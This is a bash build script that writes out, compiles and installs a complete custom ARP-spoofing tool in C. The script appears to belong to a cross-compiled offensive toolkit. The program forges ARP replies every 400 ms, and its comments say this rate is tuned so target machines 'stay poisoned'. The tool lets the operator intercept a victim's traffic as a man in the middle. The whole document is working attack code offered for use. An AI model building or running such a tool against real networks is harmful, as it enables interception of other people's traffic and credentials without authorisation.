#!/bin/bash
source "$(dirname "$0")/../env.sh"

echo ""
echo "=== Building arpspoof_strix (custom dsniff-compatible, 400ms interval) ==="

# We ship our own minimal arpspoof instead of dsniff's:
#  - no legacy libnet dependency
#  - configurable sleep (default 400ms so aggressive Linux re-ARP clients
#    stay poisoned; dsniff's hardcoded 2s loses the race)
#  - single translation unit, no autotools
cat > /opt/src/arpspoof_strix.c << 'ARPEOF'
/*
 * Minimal arpspoof — dsniff-compatible CLI:
 *   arpspoof -i <iface> -t <target_ip> <host_ip>
 *
 * Continuously tells <target_ip> that <host_ip> is at our MAC.
 * Resolves the target's MAC once (via a broadcast ARP request), then sends
 * unicast ARP REPLYs every SPOOF_INTERVAL_US microseconds.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>

#define SPOOF_INTERVAL_US 400000    /* 400 ms */
#define RESOLVE_TIMEOUT_S 5
#define ARPOP_REQUEST     1
#define ARPOP_REPLY       2

struct arp_pkt {
    struct ethhdr  eth;
    uint16_t       hw_type;
    uint16_t       proto_type;
    uint8_t        hw_len;
    uint8_t        proto_len;
    uint16_t       op;
    uint8_t        sender_mac[6];
    uint8_t        sender_ip[4];
    uint8_t        target_mac[6];
    uint8_t        target_ip[4];
} __attribute__((packed));

static void mac_str(const uint8_t *m, char *out) {
    sprintf(out, "%02x:%02x:%02x:%02x:%02x:%02x",
        m[0], m[1], m[2], m[3], m[4], m[5]);
}

static int resolve_mac(int sock, int ifindex, const uint8_t *my_mac,
                       uint32_t my_ip, uint32_t target_ip, uint8_t *out_mac) {
    struct arp_pkt req;
    memset(&req, 0, sizeof(req));
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    memcpy(req.eth.h_dest, bcast, 6);
    memcpy(req.eth.h_source, my_mac, 6);
    req.eth.h_proto  = htons(ETH_P_ARP);
    req.hw_type      = htons(1);
    req.proto_type   = htons(ETH_P_IP);
    req.hw_len       = 6;
    req.proto_len    = 4;
    req.op           = htons(ARPOP_REQUEST);
    memcpy(req.sender_mac, my_mac, 6);
    memcpy(req.sender_ip, &my_ip, 4);
    memcpy(req.target_ip, &target_ip, 4);

    struct sockaddr_ll sll = {0};
    sll.sll_family  = AF_PACKET;
    sll.sll_ifindex = ifindex;
    sll.sll_halen   = 6;
    memcpy(sll.sll_addr, bcast, 6);

    if (sendto(sock, &req, sizeof(req), 0, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
        perror("arpspoof: sendto (resolve request)");
        return -1;
    }

    time_t deadline = time(NULL) + RESOLVE_TIMEOUT_S;
    struct arp_pkt reply;
    while (time(NULL) < deadline) {
        ssize_t n = recv(sock, &reply, sizeof(reply), 0);
        if (n < (ssize_t)sizeof(reply)) continue;
        if (ntohs(reply.op) != ARPOP_REPLY) continue;
        if (memcmp(reply.sender_ip, &target_ip, 4) != 0) continue;
        memcpy(out_mac, reply.sender_mac, 6);
        return 0;
    }
    return -1;
}

int main(int argc, char **argv) {
    const char *iface = NULL, *target_str = NULL, *gw_str = NULL;
    int c;
    while ((c = getopt(argc, argv, "i:t:")) != -1) {
        if (c == 'i') iface = optarg;
        else if (c == 't') target_str = optarg;
        else { fprintf(stderr, "Usage: %s -i <iface> -t <target> <host>\n", argv[0]); return 1; }
    }
    if (optind < argc) gw_str = argv[optind];
    if (!iface || !target_str || !gw_str) {
        fprintf(stderr, "Usage: %s -i <iface> -t <target> <host>\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) { perror("arpspoof: socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) { perror("arpspoof: SIOCGIFINDEX"); return 1; }
    int ifindex = ifr.ifr_ifindex;
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { perror("arpspoof: SIOCGIFHWADDR"); return 1; }
    uint8_t my_mac[6];
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) { perror("arpspoof: SIOCGIFADDR"); return 1; }
    uint32_t my_ip =
        ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;

    uint32_t target_ip = inet_addr(target_str);
    uint32_t gw_ip     = inet_addr(gw_str);
    if (target_ip == INADDR_NONE || gw_ip == INADDR_NONE) {
        fprintf(stderr, "arpspoof: invalid IP address\n");
        return 1;
    }

    uint8_t target_mac[6];
    if (resolve_mac(sock, ifindex, my_mac, my_ip, target_ip, target_mac) != 0) {
        fprintf(stderr, "arpspoof: could not resolve target MAC\n");
        return 1;
    }

    char mac_s[18];
    mac_str(target_mac, mac_s);
    fprintf(stderr, "arpspoof: poisoning %s (%s) every %d ms, %s is now us\n",
        target_str, mac_s, SPOOF_INTERVAL_US / 1000, gw_str);

    struct arp_pkt pkt;
    memset(&pkt, 0, sizeof(pkt));
    memcpy(pkt.eth.h_dest, target_mac, 6);
    memcpy(pkt.eth.h_source, my_mac, 6);
    pkt.eth.h_proto  = htons(ETH_P_ARP);
    pkt.hw_type      = htons(1);
    pkt.proto_type   = htons(ETH_P_IP);
    pkt.hw_len       = 6;
    pkt.proto_len    = 4;
    pkt.op           = htons(ARPOP_REPLY);
    memcpy(pkt.sender_mac, my_mac, 6);
    memcpy(pkt.sender_ip, &gw_ip, 4);
    memcpy(pkt.target_mac, target_mac, 6);
    memcpy(pkt.target_ip, &target_ip, 4);

    struct sockaddr_ll sll = {0};
    sll.sll_family  = AF_PACKET;
    sll.sll_ifindex = ifindex;
    sll.sll_halen   = 6;
    memcpy(sll.sll_addr, target_mac, 6);

    for (;;) {
        if (sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&sll, sizeof(sll)) < 0) {
            perror("arpspoof: sendto");
        }
        usleep(SPOOF_INTERVAL_US);
    }
    return 0;
}
ARPEOF

${CC} ${CFLAGS} -O2 -o ${PREFIX}/bin/arpspoof /opt/src/arpspoof_strix.c
${STRIP} ${PREFIX}/bin/arpspoof

echo "=== arpspoof installed ==="
ls -lh ${PREFIX}/bin/arpspoof
file ${PREFIX}/bin/arpspoof | grep -o 'ARM aarch64' || echo 'WARN: not aarch64'
